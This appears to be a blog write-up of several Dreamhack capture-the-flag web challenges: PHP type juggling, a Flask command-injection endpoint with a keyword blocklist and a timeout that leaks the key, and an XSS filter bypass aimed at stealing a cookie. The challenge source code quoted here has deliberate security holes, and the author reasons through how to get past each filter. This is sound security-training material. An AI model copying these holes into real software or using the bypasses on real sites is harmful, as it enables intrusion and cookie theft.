class="title">box</span>&quot;&gt;</span></span><br><span class="line"><span class="class">      &lt;<span class="title">h4</span>&gt;<span class="title">Enter</span> <span class="title">the</span> <span class="title">correct</span> <span class="title">Input</span>.&lt;/<span class="title">h4</span>&gt;</span></span><br><span class="line"><span class="class">        &lt;<span class="title">p</span>&gt;</span></span><br><span class="line"><span class="class">          &lt;<span class="title">form</span> <span class="title">method</span>=&quot;<span class="title">post</span>&quot; <span class="title">action</span>=&quot;/<span class="title">check</span>.<span class="title">php</span>&quot;&gt;</span></span><br><span class="line"><span class="class">              &lt;<span class="title">input</span> <span class="title">type</span>=&quot;<span class="title">text</span>&quot; <span class="title">placeholder</span>=&quot;<span class="title">input1</span>&quot; <span class="title">name</span>=&quot;<span class="title">input1</span>&quot;&gt;</span></span><br><span class="line"><span class="class">              &lt;<span class="title">input</span> <span class="title">type</span>=&quot;<span class="title">text</span>&quot; <span class="title">placeholder</span>=&quot;<span class="title">input2</span>&quot; <span class="title">name</span>=&quot;<span class="title">input2</span>&quot;&gt;</span></span><br><span class="line"><span class="class">              &lt;<span class="title">input</span> <span class="title">type</span>=&quot;<span class="title">submit</span>&quot; <span class="title">value</span>=&quot;제출&quot;&gt;</span></span><br><span class="line"><span class="class">          &lt;/<span class="title">form</span>&gt;</span></span><br><span class="line"><span class="class">        &lt;/<span class="title">p</span>&gt;</span></span><br><span class="line"><span class="class">      &lt;/<span class="title">div</span>&gt;</span></span><br><span class="line"><span class="class"></span></span><br><span class="line"><span class="class">    &lt;?<span class="title">php</span></span></span><br><span class="line"><span class="class">        <span class="title">require_once</span>(&#x27;<span class="title">flag</span>.<span class="title">php</span>&#x27;);</span></span><br><span class="line"><span class="class">        <span class="title">error_reporting</span>(0);</span></span><br><span class="line"><span class="class">    ?&gt; </span></span><br><span class="line"><span class="class">    &lt;/<span class="title">div</span>&gt; </span></span><br><span class="line"><span class="class">&lt;/<span class="title">body</span>&gt;</span></span><br><span class="line"><span class="class">&lt;/<span class="title">html</span>&gt;</span></span><br></pre></td></tr></table></figure>

<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">    <span class="variable">$flag</span> = <span class="string">&#x27;flag&#123;**Sample**&#125;&#x27;</span></span><br><span class="line"><span class="meta">?&gt;</span> </span><br></pre></td></tr></table></figure>

<p>If u notice the check.php, a check role is about</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="keyword">if</span>(<span class="variable">$input_1</span> != <span class="string">&quot;&quot;</span> &amp;&amp; <span class="variable">$input_2</span> != <span class="string">&quot;&quot;</span>)&#123;</span><br><span class="line">        <span class="keyword">if</span>(<span class="title function_ invoke__">strlen</span>(<span class="variable">$input_1</span>) &lt; <span class="number">4</span>)&#123;</span><br><span class="line">          <span class="keyword">if</span>(<span class="variable">$input_1</span> &lt; <span class="string">&quot;8&quot;</span> &amp;&amp; <span class="variable">$input_1</span> &lt; <span class="string">&quot;7.A&quot;</span> &amp;&amp; <span class="variable">$input_1</span> &gt; <span class="string">&quot;7.9&quot;</span>)&#123;</span><br><span class="line">            <span class="keyword">if</span>(<span class="title function_ invoke__">strlen</span>(<span class="variable">$input_2</span>) &lt; <span class="number">3</span> &amp;&amp; <span class="title function_ invoke__">strlen</span>(<span class="variable">$input_2</span>) &gt; <span class="number">1</span>)&#123;</span><br><span class="line">              <span class="keyword">if</span>(<span class="variable">$input_2</span> &lt; <span class="number">74</span> &amp;&amp; <span class="variable">$input_2</span> &gt; <span class="string">&quot;74&quot;</span>)&#123;</span><br><span class="line">                <span class="keyword">echo</span> <span class="string">&quot;&lt;/br&gt;&lt;/br&gt;&lt;/br&gt;&lt;pre&gt;FLAG\n&quot;</span>;</span><br><span class="line">                <span class="keyword">echo</span> <span class="variable">$flag</span>;</span><br><span class="line">                <span class="keyword">echo</span> <span class="string">&quot;&lt;/pre&gt;&quot;</span>;</span><br><span class="line">              &#125; <span class="keyword">else</span> <span class="keyword">echo</span> <span class="string">&quot;&lt;br&gt;&lt;br&gt;&lt;br&gt;&lt;h4&gt;Good try.&lt;/h4&gt;&quot;</span>;</span><br><span class="line">            &#125; <span class="keyword">else</span> <span class="keyword">echo</span> <span class="string">&quot;&lt;br&gt;&lt;br&gt;&lt;br&gt;&lt;h4&gt;Good try.&lt;/h4&gt;&lt;br&gt;&quot;</span>;</span><br><span class="line">          &#125; <span class="keyword">else</span> <span class="keyword">echo</span> <span class="string">&quot;&lt;br&gt;&lt;br&gt;&lt;br&gt;&lt;h4&gt;Try again.&lt;/h4&gt;&lt;br&gt;&quot;</span>;</span><br><span class="line">        &#125; <span class="keyword">else</span> <span class="keyword">echo</span> <span class="string">&quot;&lt;br&gt;&lt;br&gt;&lt;br&gt;&lt;h4&gt;Try again.&lt;/h4&gt;&lt;br&gt;&quot;</span>;</span><br><span class="line">      &#125; <span class="keyword">else</span>&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&#x27;&lt;br&gt;&lt;br&gt;&lt;br&gt;&lt;h4&gt;Fill the input box.&lt;/h4&gt;&#x27;</span>;</span><br><span class="line">      &#125;</span><br><span class="line">    &#125; <span class="keyword">else</span> <span class="keyword">echo</span> <span class="string">&quot;&lt;br&gt;&lt;br&gt;&lt;br&gt;&lt;h3&gt;WHat??!&lt;/h3&gt;&quot;</span>;</span><br></pre></td></tr></table></figure>

<p><img src="/img/Dreamhack1_8.png" alt="Untitled"></p>
<ul>
<li><strong>strlen</strong></li>
</ul>
<p>(PHP 4, PHP 5, PHP 7)</p>
<p>The <code>strlen()</code> function is used to measure the length of a string.</p>
<p>**Note:**The function returns the number of bytes instead of the number of characters. (For pure ASCII texts without accept characters are the values the same).</p>
<p>let’s sort it out about this role!</p>
<ul>
<li><p>strlen input_1&lt; 4 ⇒ <strong>input_1 string length cannot exceed 4</strong></p>
<ul>
<li><strong>input_1 &lt; “7.A” &amp;&amp; input_1 &gt; “7.9”</strong> &amp;&amp; input_1 &lt; “8”</li>
<li>The character after 7 is greater than 9(dec 57) and less than A(dec 65)<ul>
<li><code>:</code> ~ <code>@</code></li>
</ul>
</li>
</ul>
</li>
<li><p>strlen($input_2) &lt; 3 &amp;&amp; strlen($input_2) &gt; 1 ⇒  <strong>input_2 string length must greater than 1 and less than 3</strong></p>
<ul>
<li>input_2 &lt; 74 &amp;&amp; input_2 &gt; “74”</li>
</ul>
<p>  In PHP, when converting a string to a number, it tries to convert the numeric part at the beginning of the string to a number until it encounters a non-numeric character. This means that if the string starts with a number, PHP will try to parse that number part into a number, ignoring subsequent characters.</p>
<p>  For example, if you have the string “7a”, PHP will try to parse “7” as a number and ignore “a”. Therefore, “7a” would be interpreted as the number 7 in this case.</p>
<p>  Similarly, for the string “7#”, PHP will also try to parse “7” as a number and ignore the “#”. Therefore, “7#” would also be interpreted as the number 7 in this case.</p>
<ul>
<li>So u just type 7 with any non-numeric character</li>
<li>But remember, the characters entered must be greater than chr 7, that is, non-numeric characters from <code>:</code> ~ <code>~</code> are allowed</li>
</ul>
</li>
</ul>
<p><img src="/img/Dreamhack1_9.png" alt="Untitled"></p>
<p><img src="/img/Dreamhack1_10.png" alt="Untitled"></p>
<p><img src="/img/Dreamhack1_11.png" alt="Untitled"></p>
<hr>
<h3 id="BypassIF"><a href="#BypassIF" class="headerlink" title="BypassIF"></a><strong>BypassIF</strong></h3><ul>
<li><strong>Description<br>Admin의 <code>KEY</code>가 필요합니다! 알맞은 <code>KEY</code>값을 입력하여 플래그를 획득하세요.<br>플래그 형식은 DH{…} 입니다.</strong></li>
</ul>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/env python3</span></span><br><span class="line"><span class="keyword">import</span> subprocess</span><br><span class="line"><span class="keyword">from</span> flask <span class="keyword">import</span> Flask, request, render_template, redirect, url_for</span><br><span class="line"><span class="keyword">import</span> string</span><br><span class="line"><span class="keyword">import</span> os</span><br><span class="line"><span class="keyword">import</span> hashlib</span><br><span class="line"></span><br><span class="line">app = Flask(__name__)</span><br><span class="line"></span><br><span class="line"><span class="keyword">try</span>:</span><br><span class="line">    FLAG = <span class="built_in">open</span>(<span class="string">&quot;./flag.txt&quot;</span>, <span class="string">&quot;r&quot;</span>).read()</span><br><span class="line"><span class="keyword">except</span>:</span><br><span class="line">    FLAG = <span class="string">&quot;[**FLAG**]&quot;</span></span><br><span class="line"></span><br><span class="line">KEY = hashlib.md5(FLAG.encode()).hexdigest()</span><br><span class="line">guest_key = hashlib.md5(<span class="string">b&quot;guest&quot;</span>).hexdigest()<span class="comment">#084e0343a0486ff05530df6c705c8bb4</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># filtering</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">filter_cmd</span>(<span class="params">cmd</span>):</span><br><span class="line">    alphabet = <span class="built_in">list</span>(string.ascii_lowercase)</span><br><span class="line">    alphabet.extend([<span class="string">&#x27; &#x27;</span>])</span><br><span class="line">    num = <span class="string">&#x27;0123456789&#x27;</span></span><br><span class="line">    alphabet.extend(num)</span><br><span class="line">    command_list = [<span class="string">&#x27;flag&#x27;</span>,<span class="string">&#x27;cat&#x27;</span>,<span class="string">&#x27;chmod&#x27;</span>,<span class="string">&#x27;head&#x27;</span>,<span class="string">&#x27;tail&#x27;</span>,<span class="string">&#x27;less&#x27;</span>,<span class="string">&#x27;awk&#x27;</span>,<span class="string">&#x27;more&#x27;</span>,<span class="string">&#x27;grep&#x27;</span>]</span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span> c <span class="keyword">in</span> command_list:</span><br><span class="line">        <span class="keyword">if</span> c <span class="keyword">in</span> cmd:</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">True</span></span><br><span class="line">    <span class="keyword">for</span> c <span class="keyword">in</span> cmd:</span><br><span class="line">        <span class="keyword">if</span> c <span class="keyword">not</span> <span class="keyword">in</span> alphabet:</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">True</span></span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&#x27;/&#x27;</span>, methods=[<span class="string">&#x27;GET&#x27;</span>, <span class="string">&#x27;POST&#x27;</span>]</span>)</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">index</span>():</span><br><span class="line">    <span class="comment"># GET request</span></span><br><span class="line">    <span class="keyword">return</span> render_template(<span class="string">&#x27;index.html&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&#x27;/flag&#x27;</span>, methods=[<span class="string">&#x27;POST&#x27;</span>]</span>)</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">flag</span>():</span><br><span class="line">     <span class="comment"># POST request</span></span><br><span class="line">    <span class="keyword">if</span> request.method == <span class="string">&#x27;POST&#x27;</span>:</span><br><span class="line">        key = request.form.get(<span class="string">&#x27;key&#x27;</span>, <span class="string">&#x27;&#x27;</span>)</span><br><span class="line">        cmd = request.form.get(<span class="string">&#x27;cmd_input&#x27;</span>, <span class="string">&#x27;&#x27;</span>)</span><br><span class="line">        <span class="keyword">if</span> cmd == <span class="string">&#x27;&#x27;</span> <span class="keyword">and</span> key == KEY:</span><br><span class="line">            <span class="keyword">return</span> render_template(<span class="string">&#x27;flag.html&#x27;</span>, txt=FLAG)</span><br><span class="line">        <span class="keyword">elif</span> cmd == <span class="string">&#x27;&#x27;</span> <span class="keyword">and</span> key == guest_key:</span><br><span class="line">            <span class="keyword">return</span> render_template(<span class="string">&#x27;guest.html&#x27;</span>, txt=<span class="string">f&quot;guest key: <span class="subst">&#123;guest_key&#125;</span>&quot;</span>)</span><br><span class="line">        <span class="keyword">if</span> cmd != <span class="string">&#x27;&#x27;</span> <span class="keyword">or</span> key == KEY:</span><br><span class="line">            <span class="keyword">if</span> <span class="keyword">not</span> filter_cmd(cmd):</span><br><span class="line">                <span class="keyword">try</span>:</span><br><span class="line">                    output = subprocess.check_output([<span class="string">&#x27;/bin/sh&#x27;</span>, <span class="string">&#x27;-c&#x27;</span>, cmd], timeout=<span class="number">5</span>)</span><br><span class="line">                    <span class="keyword">return</span> render_template(<span class="string">&#x27;flag.html&#x27;</span>, txt=output.decode(<span class="string">&#x27;utf-8&#x27;</span>))</span><br><span class="line">                <span class="keyword">except</span> subprocess.TimeoutExpired:</span><br><span class="line">                    <span class="keyword">return</span> render_template(<span class="string">&#x27;flag.html&#x27;</span>, txt=<span class="string">f&#x27;Timeout! Your key: <span class="subst">&#123;KEY&#125;</span>&#x27;</span>)</span><br><span class="line">                <span class="keyword">except</span> subprocess.CalledProcessError:</span><br><span class="line">                    <span class="keyword">return</span> render_template(<span class="string">&#x27;flag.html&#x27;</span>, txt=<span class="string">&quot;Error!&quot;</span>)</span><br><span class="line">            <span class="keyword">return</span> render_template(<span class="string">&#x27;flag.html&#x27;</span>)</span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            <span class="keyword">return</span> redirect(<span class="string">&#x27;/&#x27;</span>)</span><br><span class="line">    <span class="keyword">else</span>: </span><br><span class="line">        <span class="keyword">return</span> render_template(<span class="string">&#x27;flag.html&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">    app.run(host=<span class="string">&#x27;0.0.0.0&#x27;</span>, port=<span class="number">8000</span>, debug=<span class="literal">True</span>)</span><br></pre></td></tr></table></figure>

<p>notice here</p>
<p>if input guest</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="meta">&gt;&gt;&gt; </span>hashlib.md5(<span class="string">b&quot;guest&quot;</span>).hexdigest()</span><br><span class="line"><span class="string">&#x27;084e0343a0486ff05530df6c705c8bb4&#x27;</span></span><br></pre></td></tr></table></figure>

<p><img src="/img/Dreamhack1_12.png" alt="Untitled"></p>
<p>if input admin</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="meta">&gt;&gt;&gt; </span>hashlib.md5(<span class="string">b&quot;admin&quot;</span>).hexdigest() </span><br><span class="line"><span class="string">&#x27;21232f297a57a5a743894a0e4a801fc3&#x27;</span></span><br></pre></td></tr></table></figure>

<p><img src="/img/Dreamhack1_13.png" alt="Untitled"></p>
<p>and notic here</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">command_list = [<span class="string">&#x27;flag&#x27;</span>,<span class="string">&#x27;cat&#x27;</span>,<span class="string">&#x27;chmod&#x27;</span>,<span class="string">&#x27;head&#x27;</span>,<span class="string">&#x27;tail&#x27;</span>,<span class="string">&#x27;less&#x27;</span>,<span class="string">&#x27;awk&#x27;</span>,<span class="string">&#x27;more&#x27;</span>,<span class="string">&#x27;grep&#x27;</span>]</span><br></pre></td></tr></table></figure>

<p>if input string not in cmd_list → Error</p>
<p><img src="/img/Dreamhack1_14.png" alt="Untitled"></p>
<p>if input string in cmd_list</p>
<p><img src="/img/Dreamhack1_15.png" alt="Untitled"></p>
<p>here can see the flag.txt</p>
<p>but how to read that file?</p>
<p>we cannot do this </p>
<p><img src="/img/Dreamhack1_16.png" alt="Untitled"></p>
<p>so let’s see the code again</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">if</span> cmd != <span class="string">&#x27;&#x27;</span> <span class="keyword">or</span> key == KEY:</span><br><span class="line">            <span class="keyword">if</span> <span class="keyword">not</span> filter_cmd(cmd):</span><br><span class="line">                <span class="keyword">try</span>:</span><br><span class="line">                    output = subprocess.check_output([<span class="string">&#x27;/bin/sh&#x27;</span>, <span class="string">&#x27;-c&#x27;</span>, cmd], timeout=<span class="number">5</span>)</span><br><span class="line">                    <span class="keyword">return</span> render_template(<span class="string">&#x27;flag.html&#x27;</span>, txt=output.decode(<span class="string">&#x27;utf-8&#x27;</span>))</span><br><span class="line">                <span class="keyword">except</span> subprocess.TimeoutExpired:</span><br><span class="line">                    <span class="keyword">return</span> render_template(<span class="string">&#x27;flag.html&#x27;</span>, txt=<span class="string">f&#x27;Timeout! Your key: <span class="subst">&#123;KEY&#125;</span>&#x27;</span>)</span><br><span class="line">                <span class="keyword">except</span> subprocess.CalledProcessError:</span><br><span class="line">                    <span class="keyword">return</span> render_template(<span class="string">&#x27;flag.html&#x27;</span>, txt=<span class="string">&quot;Error!&quot;</span>)</span><br><span class="line">            <span class="keyword">return</span> render_template(<span class="string">&#x27;flag.html&#x27;</span>)</span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            <span class="keyword">return</span> redirect(<span class="string">&#x27;/&#x27;</span>)</span><br><span class="line">    <span class="keyword">else</span>: </span><br><span class="line">        <span class="keyword">return</span> render_template(<span class="string">&#x27;flag.html&#x27;</span>)</span><br></pre></td></tr></table></figure>

<p>if first to success execute command it will timeout&#x3D;5, command exec time limit 5 min</p>
<p>if exceed 5 min it will timeout</p>
<p>notice here</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">except</span> subprocess.TimeoutExpired:</span><br><span class="line">       <span class="keyword">return</span> render_template(<span class="string">&#x27;flag.html&#x27;</span>, txt=<span class="string">f&#x27;Timeout! Your key: <span class="subst">&#123;KEY&#125;</span>&#x27;</span>)</span><br></pre></td></tr></table></figure>

<p>if timeout it will output flag</p>
<p><img src="/img/Dreamhack1_17.png" alt="Untitled"></p>
<p>ok, I got the admin key, then throw the key back into the input box</p>
<p><img src="/img/Dreamhack1_18.png" alt="Untitled"></p>
<hr>
<h3 id="XSS-Filtering-Bypass-Advanced"><a href="#XSS-Filtering-Bypass-Advanced" class="headerlink" title="XSS Filtering Bypass Advanced"></a><strong>XSS Filtering Bypass Advanced</strong></h3><ul>
<li><strong>Description</strong></li>
</ul>
<p><strong>Exercise: XSS Filtering Bypass의 패치된 문제입니다.</strong></p>
<ul>
<li><strong>문제 수정 내역</strong></li>
</ul>
<p><strong>2023.08.04 Dockerfile 제공</strong></p>
<p>this question give some file</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/python3</span></span><br><span class="line"><span class="keyword">from</span> flask <span class="keyword">import</span> Flask, request, render_template</span><br><span class="line"><span class="keyword">from</span> selenium <span class="keyword">import</span> webdriver</span><br><span class="line"><span class="keyword">from</span> selenium.webdriver.chrome.service <span class="keyword">import</span> Service</span><br><span class="line"><span class="keyword">import</span> urllib</span><br><span class="line"><span class="keyword">import</span> os</span><br><span class="line"></span><br><span class="line">app = Flask(__name__)</span><br><span class="line">app.secret_key = os.urandom(<span class="number">32</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">try</span>:</span><br><span class="line">    FLAG = <span class="built_in">open</span>(<span class="string">&quot;./flag.txt&quot;</span>, <span class="string">&quot;r&quot;</span>).read()</span><br><span class="line"><span class="keyword">except</span>:</span><br><span class="line">    FLAG = <span class="string">&quot;[**FLAG**]&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">read_url</span>(<span class="params">url, cookie=&#123;<span class="string">&quot;name&quot;</span>: <span class="string">&quot;name&quot;</span>, <span class="string">&quot;value&quot;</span>: <span class="string">&quot;value&quot;</span>&#125;</span>):</span><br><span class="line">    cookie.update(&#123;<span class="string">&quot;domain&quot;</span>: <span class="string">&quot;127.0.0.1&quot;</span>&#125;)</span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        service = Service(executable_path=<span class="string">&quot;/chromedriver&quot;</span>)</span><br><span class="line">        options = webdriver.ChromeOptions()</span><br><span class="line">        <span class="keyword">for</span> _ <span class="keyword">in</span> [</span><br><span class="line">            <span class="string">&quot;headless&quot;</span>,</span><br><span class="line">            <span class="string">&quot;window-size=1920x1080&quot;</span>,</span><br><span class="line">            <span class="string">&quot;disable-gpu&quot;</span>,</span><br><span class="line">            <span class="string">&quot;no-sandbox&quot;</span>,</span><br><span class="line">            <span class="string">&quot;disable-dev-shm-usage&quot;</span>,</span><br><span class="line">        ]:</span><br><span class="line">            options.add_argument(_)</span><br><span class="line">        driver = webdriver.Chrome(service=service, options=options)</span><br><span class="line">        driver.implicitly_wait(<span class="number">3</span>)</span><br><span class="line">        driver.set_page_load_timeout(<span class="number">3</span>)</span><br><span class="line">        driver.get(<span class="string">&quot;http://127.0.0.1:8000/&quot;</span>)</span><br><span class="line">        driver.add_cookie(cookie)</span><br><span class="line">        driver.get(url)</span><br><span class="line">    <span class="keyword">except</span> Exception <span class="keyword">as</span> e:</span><br><span class="line">        driver.quit()</span><br><span class="line">        <span class="comment"># return str(e)</span></span><br><span class="line">        <span class="keyword">return</span> <span class="literal">False</span></span><br><span class="line">    driver.quit()</span><br><span class="line">    <span class="keyword">return</span> <span class="literal">True</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">check_xss</span>(<span class="params">param, cookie=&#123;<span class="string">&quot;name&quot;</span>: <span class="string">&quot;name&quot;</span>, <span class="string">&quot;value&quot;</span>: <span class="string">&quot;value&quot;</span>&#125;</span>):</span><br><span class="line">    url = <span class="string">f&quot;http://127.0.0.1:8000/vuln?param=<span class="subst">&#123;urllib.parse.quote(param)&#125;</span>&quot;</span></span><br><span class="line">    <span class="keyword">return</span> read_url(url, cookie)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">xss_filter</span>(<span class="params">text</span>):</span><br><span class="line">    _<span class="built_in">filter</span> = [<span class="string">&quot;script&quot;</span>, <span class="string">&quot;on&quot;</span>, <span class="string">&quot;javascript&quot;</span>]</span><br><span class="line">    <span class="keyword">for</span> f <span class="keyword">in</span> _<span class="built_in">filter</span>:</span><br><span class="line">        <span class="keyword">if</span> f <span class="keyword">in</span> **text.lower():<span class="comment">#ALL word will be converted to lowercase**</span></span><br><span class="line">            <span class="keyword">return</span> <span class="string">&quot;filtered!!!&quot;</span></span><br><span class="line"></span><br><span class="line">    advanced_filter = [<span class="string">&quot;window&quot;</span>, <span class="string">&quot;self&quot;</span>, <span class="string">&quot;this&quot;</span>, <span class="string">&quot;document&quot;</span>, <span class="string">&quot;location&quot;</span>, <span class="string">&quot;(&quot;</span>, <span class="string">&quot;)&quot;</span>, <span class="string">&quot;&amp;#&quot;</span>]</span><br><span class="line">    <span class="keyword">for</span> f <span class="keyword">in</span> advanced_filter:</span><br><span class="line">        <span class="keyword">if</span> f <span class="keyword">in</span> text.lower():</span><br><span class="line">            <span class="keyword">return</span> <span class="string">&quot;filtered!!!&quot;</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> text</span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&quot;/&quot;</span></span>)</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">index</span>():</span><br><span class="line">    <span class="keyword">return</span> render_template(<span class="string">&quot;index.html&quot;</span>)</span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&quot;/vuln&quot;</span></span>)</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">vuln</span>():</span><br><span class="line">    param = request.args.get(<span class="string">&quot;param&quot;</span>, <span class="string">&quot;&quot;</span>)</span><br><span class="line">    param = xss_filter(param)</span><br><span class="line">    <span class="keyword">return</span> param</span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&quot;/flag&quot;</span>, methods=[<span class="string">&quot;GET&quot;</span>, <span class="string">&quot;POST&quot;</span>]</span>)</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">flag</span>():</span><br><span class="line">    <span class="keyword">if</span> request.method == <span class="string">&quot;GET&quot;</span>:</span><br><span class="line">        <span class="keyword">return</span> render_template(<span class="string">&quot;flag.html&quot;</span>)</span><br><span class="line">    <span class="keyword">elif</span> request.method == <span class="string">&quot;POST&quot;</span>:</span><br><span class="line">        param = request.form.get(<span class="string">&quot;param&quot;</span>)</span><br><span class="line">        <span class="keyword">if</span> <span class="keyword">not</span> check_xss(param, &#123;<span class="string">&quot;name&quot;</span>: <span class="string">&quot;flag&quot;</span>, <span class="string">&quot;value&quot;</span>: FLAG.strip()&#125;):</span><br><span class="line">            <span class="keyword">return</span> <span class="string">&#x27;&lt;script&gt;alert(&quot;wrong??&quot;);history.go(-1);&lt;/script&gt;&#x27;</span></span><br><span class="line"></span><br><span class="line">        <span class="keyword">return</span> <span class="string">&#x27;&lt;script&gt;alert(&quot;good&quot;);history.go(-1);&lt;/script&gt;&#x27;</span></span><br><span class="line"></span><br><span class="line">memo_text = <span class="string">&quot;&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&quot;/memo&quot;</span></span>)</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">memo</span>():</span><br><span class="line">    <span class="keyword">global</span> memo_text</span><br><span class="line">    text = request.args.get(<span class="string">&quot;memo&quot;</span>, <span class="string">&quot;&quot;</span>)</span><br><span class="line">    memo_text += text + <span class="string">&quot;\n&quot;</span></span><br><span class="line">    <span class="keyword">return</span> render_template(<span class="string">&quot;memo.html&quot;</span>, memo=memo_text)</span><br><span class="line"></span><br><span class="line">app.run(host=<span class="string">&quot;0.0.0.0&quot;</span>, port=<span class="number">8000</span>)</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>Sort out the execution process</p>
<p>web site provide the other three page, Which is</p>
<p><img src="/img/Dreamhack1_19.png" alt="Untitled"></p>
<p>a. flag</p>
<p><img src="/img/Dreamhack1_20.png" alt="Untitled"></p>
<p>b. memo</p>
<p><img src="/img/Dreamhack1_21.png" alt="Untitled"></p>
<p>c. vuln</p>
<p><img src="/img/Dreamhack1_22.png" alt="Untitled"></p>
<p> xss_filter →  →[“script”, “on”, “javascript”,”window”, “self”, “this”, “document”, “location”, “(“, “)”, “&amp;#”] → flag fun → param, FLAG.strip() →check_xss fun → vuln page → param value encode→read_url fun</p>
<p>we can notice the xss fliter</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">def</span> <span class="title function_">xss_filter</span>(<span class="params">text</span>):</span><br><span class="line">    _<span class="built_in">filter</span> = **[<span class="string">&quot;script&quot;</span>, <span class="string">&quot;on&quot;</span>, <span class="string">&quot;javascript&quot;</span>]**</span><br><span class="line">    <span class="keyword">for</span> f <span class="keyword">in</span> _<span class="built_in">filter</span>:</span><br><span class="line">        <span class="keyword">if</span> f <span class="keyword">in</span> text.lower():</span><br><span class="line">            <span class="keyword">return</span> <span class="string">&quot;filtered!!!&quot;</span></span><br><span class="line"></span><br><span class="line">    advanced_filter = **[<span class="string">&quot;window&quot;</span>, <span class="string">&quot;self&quot;</span>, <span class="string">&quot;this&quot;</span>, <span class="string">&quot;document&quot;</span>, <span class="string">&quot;location&quot;</span>, <span class="string">&quot;(&quot;</span>, <span class="string">&quot;)&quot;</span>, <span class="string">&quot;&amp;#&quot;</span>]**</span><br><span class="line">    <span class="keyword">for</span> f <span class="keyword">in</span> advanced_filter:</span><br><span class="line">        <span class="keyword">if</span> f <span class="keyword">in</span> text.lower():</span><br><span class="line">            <span class="keyword">return</span> <span class="string">&quot;filtered!!!&quot;</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> text</span><br></pre></td></tr></table></figure>

<p>and from <code>/flag</code> get the param &amp; cookie value</p>
<ul>
<li>param value → <code>/vuln</code> using <code>urllib.parse.quote(param)</code> → param value url encode</li>
</ul>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">def</span> <span class="title function_">read_url</span>(<span class="params">url, cookie=&#123;<span class="string">&quot;name&quot;</span>: <span class="string">&quot;name&quot;</span>, <span class="string">&quot;value&quot;</span>: <span class="string">&quot;value&quot;</span>&#125;</span>):</span><br><span class="line">    cookie.update(&#123;<span class="string">&quot;domain&quot;</span>: <span class="string">&quot;127.0.0.1&quot;</span>&#125;)</span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        service = Service(executable_path=<span class="string">&quot;/chromedriver&quot;</span>)</span><br><span class="line">        options = webdriver.ChromeOptions()</span><br><span class="line">        <span class="keyword">for</span> _ <span class="keyword">in</span> [</span><br><span class="line">            <span class="string">&quot;headless&quot;</span>,</span><br><span class="line">            <span class="string">&quot;window-size=1920x1080&quot;</span>,</span><br><span class="line">            <span class="string">&quot;disable-gpu&quot;</span>,</span><br><span class="line">            <span class="string">&quot;no-sandbox&quot;</span>,</span><br><span class="line">            <span class="string">&quot;disable-dev-shm-usage&quot;</span>,</span><br><span class="line">        ]:</span><br><span class="line">            options.add_argument(_)</span><br><span class="line">        driver = webdriver.Chrome(service=service, options=options)</span><br><span class="line">        driver.implicitly_wait(<span class="number">3</span>)</span><br><span class="line">        driver.set_page_load_timeout(<span class="number">3</span>)</span><br><span class="line">        driver.get(<span class="string">&quot;http://127.0.0.1:8000/&quot;</span>)</span><br><span class="line">        **driver.add_cookie(cookie)**</span><br><span class="line">        **driver.get(url)**</span><br><span class="line">    <span class="keyword">except</span> Exception <span class="keyword">as</span> e:</span><br><span class="line">        driver.quit()</span><br><span class="line">        <span class="comment"># return str(e)</span></span><br><span class="line">        <span class="keyword">return</span> <span class="literal">False</span></span><br><span class="line">    driver.quit()</span><br><span class="line">    <span class="keyword">return</span> <span class="literal">True</span></span><br></pre></td></tr></table></figure>

<ul>
<li>Build a URL to send the get request and save it in a variable named url, then pass the created URL and cookie value to the read_url function.</li>
</ul>
<p>anyway, need to bypass the filter which is <code>xss_fliter</code> function and then let <code>document.cookie</code> value passed to <code>/memo</code>  page! </p>
